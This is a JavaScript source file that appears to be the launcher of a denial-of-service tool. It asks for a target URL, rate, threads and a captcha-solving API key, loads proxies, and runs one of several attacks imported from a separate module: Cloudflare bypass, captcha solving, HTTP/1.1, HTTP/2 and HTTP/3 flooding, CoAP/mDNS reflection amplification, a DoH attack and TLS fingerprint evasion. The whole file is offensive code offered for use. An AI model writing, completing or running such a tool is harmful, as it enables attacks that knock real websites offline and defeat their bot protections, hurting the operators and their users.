const {
    bypassCloudflare,
    solveCaptcha,
    http1FloodAttack,
    http2FloodAttack,
    http3FloodAttack,
    reflectionAmplification,
    dnsOverHttpsAttack,
    tlsEvasion
} = require('./bypass-techniques');  // Import all attack and bypass methods from bypass-techniques.js

const fs = require('fs');
const path = require('path');
const readlineSync = require('readline-sync');

// Load proxies from a file
const loadProxies = async (proxyFile) => {
    const proxies = [];
    const lines = fs.readFileSync(proxyFile, 'utf-8').split('\n');
    for (const line of lines) {
        if (line.trim()) proxies.push(line.trim());
    }
    return proxies;
};

// Main Execution Function
const main = async () => {
    // Command Line Inputs
    const targetURL = readlineSync.question('Enter the target URL: ');
    const attackTime = parseInt(readlineSync.question('Enter attack time in seconds: '), 10);
    const rate = parseInt(readlineSync.question('Enter rate (requests per second): '), 10);
    const threads = parseInt(readlineSync.question('Enter number of threads: '), 10);
    const proxyFile = path.join(__dirname, 'proxy.txt');
    const apiKey = readlineSync.question('Enter your 2Captcha API key: ');

    // Load proxies
    const proxies = await loadProxies(proxyFile);

    // Display the attack options
    console.log('\nAttack options:');
    console.log('1. Bypass Cloudflare (UAM, NoSec)');
    console.log('2. Solve CAPTCHA (2Captcha API)');
    console.log('3. HTTP/1.1 Flooding with Polymorphic Headers');
    console.log('4. HTTP/2 Multiplexed Flooding');
    console.log('5. HTTP/3 Multiplexed Flooding');
    console.log('6. CoAP or mDNS Reflection Amplification');
    console.log('7. DNS over HTTPS (DoH) Attack');
    console.log('8. TLS Fingerprinting Evasion\n');

    // Select attack type
    const attackType = parseInt(readlineSync.question('Choose an attack type (1-8): '));

    // Execute based on the selected attack type
    switch (attackType) {
        case 1:
            console.log('Starting Cloudflare Bypass (UAM, NoSec)...');
            for (let i = 0; i < threads; i++) {
                setTimeout(async () => {
                    const cookies = await bypassCloudflare(targetURL, proxies);
                    console.log(`Cloudflare cookies received: ${JSON.stringify(cookies)}`);
                }, i * 1000);
            }
            break;

        case 2:
            const siteKey = readlineSync.question('Enter the CAPTCHA site key: ');
            console.log('Starting CAPTCHA Solving...');
            for (let i = 0; i < threads; i++) {
                setTimeout(async () => {
                    const captchaToken = await solveCaptcha(siteKey, targetURL, apiKey);
                    console.log(`CAPTCHA solved: ${captchaToken}`);
                }, i * 1000);
            }
            break;

        case 3:
            console.log('Starting HTTP/1.1 Flooding attack...');
            for (let i = 0; i < threads; i++) {
                setTimeout(() => http1FloodAttack(targetURL, rate, proxies), i * 1000);
            }
            break;

        case 4:
            console.log('Starting HTTP/2 Multiplexed Flooding attack...');
            for (let i = 0; i < threads; i++) {
                setTimeout(() => http2FloodAttack(targetURL, rate, proxies), i * 1000);
            }
            break;

        case 5:
            console.log('Starting HTTP/3 Multiplexed Flooding attack...');
            for (let i = 0; i < threads; i++) {
                setTimeout(() => http3FloodAttack(targetURL, rate, proxies), i * 1000);
            }
            break;

        case 6:
            const protocol = readlineSync.question('Choose protocol for reflection amplification (coap, mdns): ').toLowerCase();
            const numPackets = parseInt(readlineSync.question('Enter number of packets: '), 10);
            console.log(`Starting ${protocol.toUpperCase()} Reflection Amplification attack...`);
            for (let i = 0; i < threads; i++) {
                setTimeout(() => reflectionAmplification(protocol, targetURL, numPackets), i * 1000);
            }
            break;

        case 7:
            console.log('Starting DNS over HTTPS (DoH) attack...');
            for (let i = 0; i < threads; i++) {
                setTimeout(() => dnsOverHttpsAttack(targetURL, rate, proxies), i * 1000);
            }
            break;

        case 8:
            console.log('Starting TLS Fingerprinting Evasion...');
            for (let i = 0; i < threads; i++) {
                setTimeout(() => tlsEvasion(targetURL, rate, proxies), i * 1000);
            }
            break;

        default:
            console.log('Invalid attack type selected.');
            break;
    }

    // End the attack after the specified duration
    setTimeout(() => {
        console.log('Attack completed.');
        process.exit();
    }, attackTime * 1000);
};

// Run the main function
main();